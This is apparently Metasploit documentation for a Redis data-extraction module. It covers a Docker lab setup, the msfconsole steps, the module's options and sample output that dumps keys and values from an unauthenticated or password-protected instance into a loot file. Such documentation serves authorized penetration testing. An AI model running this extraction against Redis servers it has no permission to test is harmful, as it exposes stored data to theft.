## Vulnerable Application

This module attaches to a Redis instance and extracts all stored keys and their associated data. If multiple databases are present the module will iterate through each.

This module works on Redis versions 2.8.0 and later, and has been tested on versions through 6.0.8.

To prepare a test instance of Redis,first install Redis v2.8.0 or greater. This can be done in docker with:

`docker run -d -p 6379:6379 --name redis redis`

Next, add some data to the database:

`echo 'set key1 value1' | nc 127.0.0.1 6379 > /dev/null` (MacOS, may differ on Linux)

Alternately, to run docker with a password:

```bash
docker run -d -p 6379:6379 --name redis redis --requirepass abcde
echo 'auth abcde \n set key2 value2' | nc 127.0.0.1 6379 > /dev/null
``` 


## Verification Steps

1. Install Redis and add data as described above.
1. Start `msfconsole`
1. Do: `use auxiliary/gather/redis_extractor`
1. Do: `set rhosts [ip.of.redis.app]` 
1. Do: `set PASSWORD [redis_password]` (optional)
1. Do: `check` (optional)
1. You will receive information about the Redis instalce.
1. Do: `run`
1. You will receive a screendump of the cached keys and contet.
1. A CSV file with keys and content will be saved in your loot directory.

## Options

### PASSWORD

The password for the redis instance. This value will be ignored for instances with no password required.

### LIMIT_COUNT

Stop after retrieving this number of keys, per datastore. Note that one redis instance may have more than one datastore. This modules also pulls values down in batches, so it may go slightly over this limit.

## Scenarios

### Check 

```
msf6 > use auxiliary/gather/redis_extractor
msf6 auxiliary(gather/redis_extractor) > set rhosts 172.22.12.168
rhosts => 172.22.12.168
msf6 auxiliary(gather/redis_extractor) > check

[+] 172.22.12.168:6379    - Connected to Redis version 6.0.8
[*] 172.22.12.168:6379    - OS is Linux 5.4.39-linuxkit x86_64
[*] 172.22.12.168:6379 - The target appears to be vulnerable.
msf6 auxiliary(gather/redis_extractor) >
```

### Run

```
msf6 > use auxiliary/gather/redis_extractor
msf6 auxiliary(gather/redis_extractor) > set rhosts 172.22.12.168
rhosts => 172.22.12.168
msf6 auxiliary(gather/redis_extractor) > run

[+] 172.22.12.168:6379    - Connected to Redis version 6.0.8
[*] 172.22.12.168:6379    - Extracting about 1 keys from database 0

Data from 172.22.12.168:6379    database 0
==========================================

 Key   Value
 ---   -----
 key1  value1

[+] 172.22.12.168:6379    - Redis data stored at /root/.msf4/loot/20201113203708_default_172.22.12.168_redis.dump_db0_836292.txt
[*] 172.22.12.168:6379    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(gather/redis_extractor) >
```
